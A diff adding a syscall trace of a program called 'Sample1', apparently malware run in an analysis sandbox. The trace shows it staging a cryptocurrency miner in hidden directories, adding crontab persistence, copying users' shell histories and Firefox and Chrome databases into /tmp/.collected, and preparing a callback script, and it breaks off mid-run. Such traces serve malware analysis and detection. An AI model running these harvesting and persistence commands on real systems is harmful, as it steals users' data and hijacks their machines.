@@ -1,0 +1,380 @@
+212   execve("samples/Sample1", ["samples/Sample1"], 0x7ffe28c95e28 /* 9 vars */) = 0
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+213   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /tmp/.xmrig 2>/dev/null"], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 213
+213   <... execve resumed>)             = 0
+212   wait4(213,  <unfinished ...>
+213   vfork( <unfinished ...>
+214   execve("/usr/bin/mkdir", ["mkdir", "-p", "/tmp/.xmrig"], 0x5cc5b4520668 /* 9 vars */ <unfinished ...>
+213   <... vfork resumed>)              = 214
+213   wait4(-1,  <unfinished ...>
+214   <... execve resumed>)             = 0
+214   exit_group(0)                     = ?
+214   +++ exited with 0 +++
+213   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 214
+213   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=214, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+213   wait4(-1, 0x7ffd624972cc, WNOHANG, NULL) = -1 ECHILD (No child processes)
+213   exit_group(0)                     = ?
+213   +++ exited with 0 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 213
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=213, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+215   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /opt/.xmr 2>/dev/null"], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 215
+215   <... execve resumed>)             = 0
+212   wait4(215,  <unfinished ...>
+215   vfork( <unfinished ...>
+216   execve("/usr/bin/mkdir", ["mkdir", "-p", "/opt/.xmr"], 0x5d1ba57a6668 /* 9 vars */ <unfinished ...>
+215   <... vfork resumed>)              = 216
+216   <... execve resumed>)             = 0
+215   wait4(-1,  <unfinished ...>
+216   exit_group(0)                     = ?
+216   +++ exited with 0 +++
+215   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 216
+215   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=216, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+215   wait4(-1, 0x7ffeb5b8967c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+215   exit_group(0)                     = ?
+215   +++ exited with 0 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 215
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=215, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+212   clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x72ef40699a10) = 217
+212   wait4(217,  <unfinished ...>
+217   execve("/tmp/.xmrig/miner", ["miner", "30"], 0x7ffdafc90728 /* 9 vars */) = 0
+217   clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x3ea2690) = 218
+217   exit_group(0)                     = ?
+217   +++ exited with 0 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 217
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=217, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+219   execve("/bin/sh", ["sh", "-c", "--", "(crontab -l 2>/dev/null; echo \"@"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 219
+219   <... execve resumed>)             = 0
+212   wait4(219,  <unfinished ...>
+219   clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x759ce9baba10) = 220
+219   clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x759ce9baba10) = 221
+219   wait4(-1,  <unfinished ...>
+221   exit_group(127)                   = ?
+221   +++ exited with 127 +++
+219   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0, NULL) = 221
+219   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=221, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+219   wait4(-1,  <unfinished ...>
+220   --- SIGPIPE {si_signo=SIGPIPE, si_code=SI_USER, si_pid=220, si_uid=0} ---
+220   +++ killed by SIGPIPE +++
+219   <... wait4 resumed>[{WIFSIGNALED(s) && WTERMSIG(s) == SIGPIPE}], 0, NULL) = 220
+219   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=220, si_uid=0, si_status=SIGPIPE, si_utime=0, si_stime=0} ---
+219   wait4(-1, 0x7fff08fc691c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+219   exit_group(127)                   = ?
+219   +++ exited with 127 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0, NULL) = 219
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=219, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+222   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /tmp/.collected 2>/dev/"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 222
+212   wait4(222,  <unfinished ...>
+222   <... execve resumed>)             = 0
+222   vfork( <unfinished ...>
+223   execve("/usr/bin/mkdir", ["mkdir", "-p", "/tmp/.collected"], 0x5fa85e7ac668 /* 9 vars */ <unfinished ...>
+222   <... vfork resumed>)              = 223
+222   wait4(-1,  <unfinished ...>
+223   <... execve resumed>)             = 0
+223   exit_group(0)                     = ?
+223   +++ exited with 0 +++
+222   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 223
+222   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=223, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+222   wait4(-1, 0x7ffe7a90369c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+222   exit_group(0)                     = ?
+222   +++ exited with 0 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 222
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=222, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+224   execve("/bin/sh", ["sh", "-c", "--", "cp /root/.bash_history /tmp/.col"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 224
+212   wait4(224,  <unfinished ...>
+224   <... execve resumed>)             = 0
+224   vfork( <unfinished ...>
+225   execve("/usr/bin/cp", ["cp", "/root/.bash_history", "/tmp/.collected/history_root"], 0x5f960158b568 /* 9 vars */ <unfinished ...>
+224   <... vfork resumed>)              = 225
+224   wait4(-1,  <unfinished ...>
+225   <... execve resumed>)             = 0
+225   exit_group(1)                     = ?
+225   +++ exited with 1 +++
+224   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 225
+224   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=225, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+224   wait4(-1, 0x7ffe7e78ce6c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+224   exit_group(1)                     = ?
+224   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 224
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=224, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+226   execve("/bin/sh", ["sh", "-c", "--", "cp /nonexistent/.bash_history /t"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 226
+212   wait4(226,  <unfinished ...>
+226   <... execve resumed>)             = 0
+226   vfork( <unfinished ...>
+227   execve("/usr/bin/cp", ["cp", "/nonexistent/.bash_history", "/tmp/.collected/history_nobody"], 0x5f453845a590 /* 9 vars */ <unfinished ...>
+226   <... vfork resumed>)              = 227
+226   wait4(-1,  <unfinished ...>
+227   <... execve resumed>)             = 0
+227   exit_group(1)                     = ?
+227   +++ exited with 1 +++
+226   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 227
+226   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=227, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+226   wait4(-1, 0x7ffd2546078c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+226   exit_group(1)                     = ?
+226   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 226
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=226, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+228   execve("/bin/sh", ["sh", "-c", "--", "cp /home/ubuntu/.bash_history /t"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 228
+228   <... execve resumed>)             = 0
+212   wait4(228,  <unfinished ...>
+228   vfork( <unfinished ...>
+229   execve("/usr/bin/cp", ["cp", "/home/ubuntu/.bash_history", "/tmp/.collected/history_ubuntu"], 0x6482f24ae590 /* 9 vars */ <unfinished ...>
+228   <... vfork resumed>)              = 229
+228   wait4(-1,  <unfinished ...>
+229   <... execve resumed>)             = 0
+229   exit_group(1)                     = ?
+229   +++ exited with 1 +++
+228   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 229
+228   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=229, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+228   wait4(-1, 0x7fff294e660c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+228   exit_group(1)                     = ?
+228   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 228
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=228, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+230   execve("/bin/sh", ["sh", "-c", "--", "cp /home/uubuntu/.bash_history /"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 230
+212   wait4(230,  <unfinished ...>
+230   <... execve resumed>)             = 0
+230   vfork( <unfinished ...>
+231   execve("/usr/bin/cp", ["cp", "/home/uubuntu/.bash_history", "/tmp/.collected/history_uubuntu"], 0x578005b94590 /* 9 vars */ <unfinished ...>
+230   <... vfork resumed>)              = 231
+231   <... execve resumed>)             = 0
+230   wait4(-1,  <unfinished ...>
+231   exit_group(1)                     = ?
+231   +++ exited with 1 +++
+230   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 231
+230   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=231, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+230   wait4(-1, 0x7ffe5a922b1c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+230   exit_group(1)                     = ?
+230   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 230
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=230, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+232   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /tmp/.collected/browser"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 232
+212   wait4(232,  <unfinished ...>
+232   <... execve resumed>)             = 0
+232   vfork( <unfinished ...>
+233   execve("/usr/bin/mkdir", ["mkdir", "-p", "/tmp/.collected/browsers"], 0x61664a8e2668 /* 9 vars */ <unfinished ...>
+232   <... vfork resumed>)              = 233
+232   wait4(-1,  <unfinished ...>
+233   <... execve resumed>)             = 0
+233   exit_group(0)                     = ?
+233   +++ exited with 0 +++
+232   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 233
+232   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=233, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+232   wait4(-1, 0x7ffe907ca1fc, WNOHANG, NULL) = -1 ECHILD (No child processes)
+232   exit_group(0)                     = ?
+232   +++ exited with 0 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 232
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=232, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+234   execve("/bin/sh", ["sh", "-c", "--", "find /root/.mozilla/firefox -nam"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 234
+212   wait4(234,  <unfinished ...>
+234   <... execve resumed>)             = 0
+234   vfork( <unfinished ...>
+235   execve("/usr/bin/find", ["find", "/root/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x5638bad90778 /* 9 vars */ <unfinished ...>
+234   <... vfork resumed>)              = 235
+234   wait4(-1,  <unfinished ...>
+235   <... execve resumed>)             = 0
+235   exit_group(1)                     = ?
+235   +++ exited with 1 +++
+234   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 235
+234   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=235, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+234   wait4(-1, 0x7ffc7e9af48c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+234   exit_group(1)                     = ?
+234   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 234
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=234, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+236   execve("/bin/sh", ["sh", "-c", "--", "find /root/.config/google-chrome"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 236
+212   wait4(236,  <unfinished ...>
+236   <... execve resumed>)             = 0
+236   vfork( <unfinished ...>
+237   execve("/usr/bin/find", ["find", "/root/.config/google-chrome", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x5a377c2457d0 /* 9 vars */ <unfinished ...>
+236   <... vfork resumed>)              = 237
+236   wait4(-1,  <unfinished ...>
+237   <... execve resumed>)             = 0
+237   exit_group(1)                     = ?
+237   +++ exited with 1 +++
+236   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 237
+236   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=237, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+236   wait4(-1, 0x7ffd926da98c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+236   exit_group(1)                     = ?
+236   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 236
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=236, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+238   execve("/bin/sh", ["sh", "-c", "--", "find /nonexistent/.mozilla/firef"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 238
+212   wait4(238,  <unfinished ...>
+238   <... execve resumed>)             = 0
+238   vfork( <unfinished ...>
+239   execve("/usr/bin/find", ["find", "/nonexistent/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x5679537337d0 /* 9 vars */ <unfinished ...>
+238   <... vfork resumed>)              = 239
+238   wait4(-1,  <unfinished ...>
+239   <... execve resumed>)             = 0
+239   exit_group(1)                     = ?
+239   +++ exited with 1 +++
+238   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 239
+238   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=239, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+238   wait4(-1, 0x7ffd69f8b1cc, WNOHANG, NULL) = -1 ECHILD (No child processes)
+238   exit_group(1)                     = ?
+238   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 238
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=238, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+240   execve("/bin/sh", ["sh", "-c", "--", "find /nonexistent/.config/google"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 240
+212   wait4(240,  <unfinished ...>
+240   <... execve resumed>)             = 0
+240   vfork( <unfinished ...>
+241   execve("/usr/bin/find", ["find", "/nonexistent/.config/google-chro"..., "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x64941d62d7d0 /* 9 vars */ <unfinished ...>
+240   <... vfork resumed>)              = 241
+240   wait4(-1,  <unfinished ...>
+241   <... execve resumed>)             = 0
+241   exit_group(1)                     = ?
+241   +++ exited with 1 +++
+240   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 241
+240   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=241, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+240   wait4(-1, 0x7ffc9d7bc71c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+240   exit_group(1)                     = ?
+240   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 240
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=240, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+242   execve("/bin/sh", ["sh", "-c", "--", "find /home/ubuntu/.mozilla/firef"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 242
+212   wait4(242,  <unfinished ...>
+242   <... execve resumed>)             = 0
+242   vfork( <unfinished ...>
+243   execve("/usr/bin/find", ["find", "/home/ubuntu/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x625ad54957d0 /* 9 vars */ <unfinished ...>
+242   <... vfork resumed>)              = 243
+242   wait4(-1,  <unfinished ...>
+243   <... execve resumed>)             = 0
+243   exit_group(1)                     = ?
+243   +++ exited with 1 +++
+242   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 243
+242   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=243, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+242   wait4(-1, 0x7fff816968dc, WNOHANG, NULL) = -1 ECHILD (No child processes)
+242   exit_group(1)                     = ?
+242   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 242
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=242, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+244   execve("/bin/sh", ["sh", "-c", "--", "find /home/ubuntu/.config/google"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 244
+212   wait4(244,  <unfinished ...>
+244   <... execve resumed>)             = 0
+244   vfork( <unfinished ...>
+245   execve("/usr/bin/find", ["find", "/home/ubuntu/.config/google-chro"..., "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x5c204bdb97d0 /* 9 vars */ <unfinished ...>
+244   <... vfork resumed>)              = 245
+244   wait4(-1,  <unfinished ...>
+245   <... execve resumed>)             = 0
+245   exit_group(1)                     = ?
+245   +++ exited with 1 +++
+244   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 245
+244   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=245, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+244   wait4(-1, 0x7fff3bb2becc, WNOHANG, NULL) = -1 ECHILD (No child processes)
+244   exit_group(1)                     = ?
+244   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 244
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=244, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+246   execve("/bin/sh", ["sh", "-c", "--", "find /home/uubuntu/.mozilla/fire"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 246
+246   <... execve resumed>)             = 0
+212   wait4(246,  <unfinished ...>
+246   vfork( <unfinished ...>
+247   execve("/usr/bin/find", ["find", "/home/uubuntu/.mozilla/firefox", "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x57837a4de7d0 /* 9 vars */ <unfinished ...>
+246   <... vfork resumed>)              = 247
+246   wait4(-1,  <unfinished ...>
+247   <... execve resumed>)             = 0
+247   exit_group(1)                     = ?
+247   +++ exited with 1 +++
+246   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 247
+246   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=247, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+246   wait4(-1, 0x7ffd50e2b57c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+246   exit_group(1)                     = ?
+246   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 246
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=246, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+248   execve("/bin/sh", ["sh", "-c", "--", "find /home/uubuntu/.config/googl"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 248
+212   wait4(248,  <unfinished ...>
+248   <... execve resumed>)             = 0
+248   vfork( <unfinished ...>
+249   execve("/usr/bin/find", ["find", "/home/uubuntu/.config/google-chr"..., "-name", "*.sqlite", "-exec", "cp", "{}", "/tmp/.collected/browsers/", ";"], 0x61d8aa1717d0 /* 9 vars */ <unfinished ...>
+248   <... vfork resumed>)              = 249
+249   <... execve resumed>)             = 0
+248   wait4(-1,  <unfinished ...>
+249   exit_group(1)                     = ?
+249   +++ exited with 1 +++
+248   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 249
+248   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=249, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+248   wait4(-1, 0x7ffd56fc332c, WNOHANG, NULL) = -1 ECHILD (No child processes)
+248   exit_group(1)                     = ?
+248   +++ exited with 1 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 1}], 0, NULL) = 248
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=248, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+250   execve("/bin/sh", ["sh", "-c", "--", "chmod +x /tmp/.callback.sh"], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 250
+212   wait4(250,  <unfinished ...>
+250   <... execve resumed>)             = 0
+250   vfork( <unfinished ...>
+251   execve("/usr/bin/chmod", ["chmod", "+x", "/tmp/.callback.sh"], 0x623c38f1b5f0 /* 9 vars */ <unfinished ...>
+250   <... vfork resumed>)              = 251
+250   wait4(-1,  <unfinished ...>
+251   <... execve resumed>)             = 0
+251   exit_group(0)                     = ?
+251   +++ exited with 0 +++
+250   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 251
+250   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=251, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+250   wait4(-1, 0x7ffef0ea49dc, WNOHANG, NULL) = -1 ECHILD (No child processes)
+250   exit_group(0)                     = ?
+250   +++ exited with 0 +++
+212   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 250
+212   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=250, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+212   clone3({flags=CLONE_VM|CLONE_VFORK|CLONE_CLEAR_SIGHAND, exit_signal=SIGCHLD, stack=0x72ef40690000, stack_size=0x9000}, 88 <unfinished ...>
+252   execve("/bin/sh", ["sh", "-c", "--", "(crontab -l 2>/dev/null; echo \"0"...], 0x7ffdafc90728 /* 9 vars */ <unfinished ...>
+212   <... clone3 resumed>)             = 252
+212   wait4(252,  <unfinished ...>
+252   <... execve resumed>)             = 0
+252   clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7325e148ea10) = 253
+252   clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7325e148ea10) = 254
+252   wait4(-1,  <unfinished ...>
+253   exit_group(0)                     = ?
+253   +++ exited with 0 +++
+252   <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 253
+252   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=253, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+252   wait4(-1,  <unfinished ...>
